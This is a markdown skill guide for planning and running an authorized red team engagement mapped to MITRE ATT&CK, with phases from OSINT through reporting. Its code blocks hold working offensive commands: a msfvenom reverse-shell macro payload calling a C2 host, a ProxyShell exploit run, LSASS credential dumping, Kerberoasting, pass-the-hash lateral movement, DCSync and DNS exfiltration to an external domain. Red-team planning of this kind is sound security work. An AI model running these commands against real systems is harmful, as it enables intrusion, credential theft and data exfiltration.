---
name: conducting-full-scope-red-team-engagement
description: Plan and execute a comprehensive red team engagement covering reconnaissance through post-exploitation using MITRE ATT&CK-aligned TTPs to evaluate an organization's detection and response capabilities.
domain: cybersecurity
subdomain: red-teaming
tags: [red-team, adversary-emulation, mitre-attack, penetration-testing, offensive-security, purple-team, ttp-mapping]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Conducting Full-Scope Red Team Engagement

## Overview

A full-scope red team engagement simulates real-world adversary behavior across all phases of the cyber kill chain — from initial reconnaissance through data exfiltration — to evaluate an organization's detection, prevention, and response capabilities. Unlike penetration testing, red team operations prioritize stealth, persistence, and objective-based scenarios that mimic advanced persistent threats (APTs).

## Prerequisites

- Written authorization (Rules of Engagement document) signed by executive leadership
- Defined scope including in-scope/out-of-scope systems, escalation contacts, and emergency stop procedures
- Threat intelligence on relevant adversary groups (e.g., APT29, FIN7, Lazarus Group)
- Red team infrastructure: C2 servers, redirectors, phishing domains, payload development environment
- Legal review confirming compliance with Computer Fraud and Abuse Act (CFAA) and local laws

## Engagement Phases

### Phase 1: Planning and Threat Modeling

Map the engagement to specific MITRE ATT&CK tactics and techniques based on the threat profile:

| Kill Chain Phase | MITRE ATT&CK Tactic | Example Techniques |
|---|---|---|
| Reconnaissance | TA0043 | T1593 Search Open Websites/Domains, T1589 Gather Victim Identity Info |
| Resource Development | TA0042 | T1583.001 Acquire Infrastructure: Domains, T1587.001 Develop Capabilities: Malware |
| Initial Access | TA0001 | T1566.001 Spearphishing Attachment, T1078 Valid Accounts |
| Execution | TA0002 | T1059.001 PowerShell, T1204.002 User Execution: Malicious File |
| Persistence | TA0003 | T1053.005 Scheduled Task, T1547.001 Registry Run Keys |
| Privilege Escalation | TA0004 | T1068 Exploitation for Privilege Escalation, T1548.002 UAC Bypass |
| Defense Evasion | TA0005 | T1055 Process Injection, T1027 Obfuscated Files |
| Credential Access | TA0006 | T1003.001 LSASS Memory, T1558.003 Kerberoasting |
| Discovery | TA0007 | T1087 Account Discovery, T1018 Remote System Discovery |
| Lateral Movement | TA0008 | T1021.002 SMB/Windows Admin Shares, T1550.002 Pass the Hash |
| Collection | TA0009 | T1560 Archive Collected Data, T1213 Data from Information Repositories |
| Exfiltration | TA0010 | T1041 Exfiltration Over C2 Channel, T1048 Exfiltration Over Alternative Protocol |
| Impact | TA0040 | T1486 Data Encrypted for Impact, T1489 Service Stop |

### Phase 2: Reconnaissance (OSINT)

```bash
# Passive DNS enumeration
amass enum -passive -d target.com -o amass_passive.txt

# Certificate transparency log search
python3 -c "
import requests
url = 'https://crt.sh/?q=%.target.com&output=json'
r = requests.get(url)
for cert in r.json():
    print(cert['name_value'])
" | sort -u > subdomains.txt

# LinkedIn employee enumeration
theHarvester -d target.com -b linkedin -l 500 -f harvest_results

# Technology fingerprinting
whatweb -v target.com --log-json=whatweb.json

# Breach data credential search (authorized)
h8mail -t target.com -o h8mail_results.csv
```

### Phase 3: Initial Access

Common initial access vectors for red team engagements:

**Spearphishing (T1566.001):**
```bash
# Generate payload with macro
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=c2.redteam.local LPORT=443 -f vba -o macro.vba

# Set up GoPhish campaign
# Configure SMTP profile, email template with pretexted lure, and landing page
gophish --config config.json
```

**External Service Exploitation (T1190):**
```bash
# Scan for vulnerable services
nmap -sV -sC --script vuln -p 80,443,8080,8443 target.com -oA vuln_scan

# Exploit known CVE (example: ProxyShell CVE-2021-34473)
python3 proxyshell_exploit.py -t mail.target.com -e attacker@target.com
```

### Phase 4: Post-Exploitation and Lateral Movement

```powershell
# Situational awareness (T1082, T1016)
whoami /all
systeminfo
ipconfig /all
net group "Domain Admins" /domain
nltest /dclist:target.com

# Credential harvesting from LSASS (T1003.001)
# Using Havoc C2 built-in module
dotnet inline-execute SafetyKatz.exe sekurlsa::logonpasswords

# Kerberoasting (T1558.003)
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Lateral movement via WMI (T1047)
wmiexec.py domain/user:password@target-dc -c "whoami"

# Lateral movement via PsExec (T1021.002)
psexec.py domain/admin:password@fileserver.target.com
```

### Phase 5: Objective Achievement

Define and pursue specific objectives:

1. **Domain Dominance**: Achieve Domain Admin access and DCSync credentials
2. **Data Exfiltration**: Locate and exfiltrate crown jewel data (e.g., PII, financial records)
3. **Business Impact Simulation**: Demonstrate ransomware deployment capability (without execution)
4. **Physical Access**: Badge cloning, tailgating, server room access

```bash
# DCSync attack (T1003.006)
secretsdump.py domain/admin:password@dc01.target.com -just-dc-ntlm

# Exfiltration over DNS (T1048.003)
dnscat2 --dns "domain=exfil.redteam.com" --secret=s3cr3t
```

### Phase 6: Reporting and Debrief

The report should include:

1. **Executive Summary**: Business impact, risk rating, key findings
2. **Attack Narrative**: Timeline of activities with screenshots and evidence
3. **MITRE ATT&CK Mapping**: Full heat map of techniques used
4. **Findings**: Each finding with CVSS score, evidence, remediation
5. **Detection Gap Analysis**: What the SOC detected vs. what was missed
6. **Purple Team Recommendations**: Specific detection rules for gaps identified

## Metrics and KPIs

| Metric | Description |
|---|---|
| Mean Time to Detect (MTTD) | Average time from action to SOC detection |
| Mean Time to Respond (MTTR) | Average time from detection to containment |
| TTP Coverage | Percentage of executed techniques detected |
| Objective Achievement Rate | Percentage of defined objectives completed |
| Dwell Time | Total time red team maintained access undetected |

## Tools and Frameworks

- **C2 Frameworks**: Havoc, Cobalt Strike, Sliver, Mythic, Brute Ratel C4
- **Reconnaissance**: Amass, Recon-ng, theHarvester, SpiderFoot
- **Exploitation**: Metasploit, Impacket, CrackMapExec, Rubeus
- **Post-Exploitation**: Mimikatz, SharpCollection, BOF.NET
- **Reporting**: PlexTrac, Ghostwriter, Serpico

## References

- MITRE ATT&CK Framework: https://attack.mitre.org/
- Red Team Guide: https://redteam.guide/
- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org/
- TIBER-EU Framework for Red Teaming: https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/
- CBEST Intelligence-Led Testing: https://www.bankofengland.co.uk/financial-stability/financial-sector-continuity
